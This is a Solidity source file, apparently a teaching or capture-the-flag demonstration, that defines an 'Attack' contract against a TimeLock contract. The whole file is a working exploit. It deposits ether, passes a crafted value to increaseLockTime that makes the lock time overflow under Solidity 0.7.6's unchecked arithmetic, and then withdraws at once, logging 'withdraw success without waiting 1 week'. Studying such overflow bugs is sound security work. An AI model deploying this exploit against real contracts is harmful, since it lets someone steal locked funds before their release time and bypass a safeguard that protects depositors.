// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
import "./Timelock.sol";
import "hardhat/console.sol";


contract Attack {
    TimeLock timeLock;
    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        console.log("Attack: deposit success");
        timeLock.increaseLockTime(
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );
        console.log("Attack: overflow time lock success ");
        timeLock.withdraw();
        console.log("Attack: withdraw success without waiting 1 week");
    }
}